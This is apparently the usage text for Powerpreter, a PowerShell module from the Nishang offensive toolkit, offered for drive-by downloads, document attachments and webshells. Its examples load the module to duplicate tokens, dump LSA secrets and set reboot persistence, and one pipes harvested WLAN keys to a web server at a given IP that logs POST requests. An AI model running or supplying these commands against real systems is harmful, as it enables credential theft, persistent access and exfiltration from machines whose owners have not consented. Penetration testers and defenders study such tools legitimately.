#####Powerpreter is a script module which makes it useful in scenarios like drive-by-download, document attachments, webshells etc. where one may like to pull all the functionality in Nishang in a single file or where deployment is not easy to do. Powerpreter has persistence capabilities too. See examples for help in using it.

#####Examples

.EXAMPLE

PS > Import-Module .\Powerpreter.psm1

PS> Get-Command -Module powerpreter

The first command imports the module in current powershell session.

The second command lists all the functions available with powerpreter.

.EXAMPLE

PS > Import-Module .\Powerpreter.psm1; Enable-DuplicateToken; Get-LSASecret

Use above command to import powerpreter in current powershell session and execute the two functions.

.EXAMPLE

PS > Import-Module .\Powerpreter.psm1; Persistence

Use above for reboot persistence

.EXAMPLE

PS > Import-Module .\Powerpreter.psm1

PS > Get-WLAN-Keys | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php

Use above for exfiltration to a webserver which logs POST requests.
